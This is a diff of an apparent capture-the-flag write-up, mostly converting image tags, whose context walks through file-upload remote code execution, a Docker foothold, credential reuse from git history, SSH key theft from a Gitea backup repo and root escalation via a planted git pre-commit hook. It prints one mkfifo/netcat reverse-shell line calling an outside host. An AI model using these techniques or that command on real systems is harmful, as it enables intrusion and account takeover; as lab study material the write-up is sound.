@@ -4,7 +4,7 @@
 
 Nmap scan results:
 
-<figure><img src="../../../.gitbook/assets/image (3154).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3154).png>)
 
 Take note of port 3000, it will be important later!
 
@@ -12,13 +12,13 @@ Take note of port 3000, it will be important later!
 
 This website was a file sharing application where we could upload files:
 
-<figure><img src="../../../.gitbook/assets/image (3528).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3528).png>)
 
 Interestingly, we were allowed to download the entire repository here:
 
-<figure><img src="../../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(378).png>)
 
-<figure><img src="../../../.gitbook/assets/image (2867).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2867).png>)
 
 The `source.zip` file also contained a `.git` repo that we could analyse later.
 
@@ -64,19 +64,19 @@ Then, we can attempt to upload this file onto the server. We would need to inter
 
 When we intercept and change the name of the file, we would be able to access our new endpoint. We can confirm RCE through a simple ping command:
 
-<figure><img src="../../../.gitbook/assets/image (684).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(684).png>)
 
-<figure><img src="../../../.gitbook/assets/image (3383).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3383).png>)
 
 Then, we can gain a reverse shell via the `mkfifo` command into a Docker Container.
 
-<figure><img src="../../../.gitbook/assets/image (1824).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1824).png>)
 
 ## Docker Escape
 
 Within this container, we can see other foreign addresses that are around:
 
-<figure><img src="../../../.gitbook/assets/image (3155).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3155).png>)
 
 172.17.0.1 was another address that was present on the host.
 
@@ -86,7 +86,7 @@ I couldn't find much from the container, so I went ahead with enumerating the gi
 
 By using `git log`, I was able to find some credentials for anotehr application elsewhere.
 
-<figure><img src="../../../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(952).png>)
 
 Earlier, we found port 3000 to be inaccessible from our host. From the docker however, it could be accessed. I downloaded `chisel` onto the container and forwarded port 3000.
 
@@ -94,15 +94,15 @@ Earlier, we found port 3000 to be inaccessible from our host. From the docker ho
 
 When this port was accessed, it was a Gitea instance:
 
-<figure><img src="../../../.gitbook/assets/image (1238).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1238).png>)
 
 Signing into Gitea with the credentials we found earlier works.
 
-<figure><img src="../../../.gitbook/assets/image (847).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(847).png>)
 
 Notice that there's a home-backup repo, and within it are the user's SSH keys:
 
-<figure><img src="../../../.gitbook/assets/image (1605).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1605).png>)
 
 We can then the SSH keys to gain access to the `dev01` user.
 
@@ -110,11 +110,11 @@ We can then the SSH keys to gain access to the `dev01` user.
 
 LinPEAS didn't reveal a lot to me, so I opted for `pspy64` to view the processes.
 
-<figure><img src="../../../.gitbook/assets/image (3260).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3260).png>)
 
 I saw this process run by root:
 
-<figure><img src="../../../.gitbook/assets/image (2993).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2993).png>)
 
 Every minute or so, it seems that this git repository is being updated on the Gitea instance. Based on GTFOBins, **git hooks** can be abused here to execute any script we want.
 
@@ -130,8 +130,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.3 4444 > /tmp/f
 
 Afterwards, we just need to name this script `pre-commit` and place it within the `~/.git/hooks` folder.
 
-<figure><img src="../../../.gitbook/assets/image (3608).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3608).png>)
 
 After a few minutes, a listener port should catch a shell:
 
-<figure><img src="../../../.gitbook/assets/image (2396).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2396).png>)
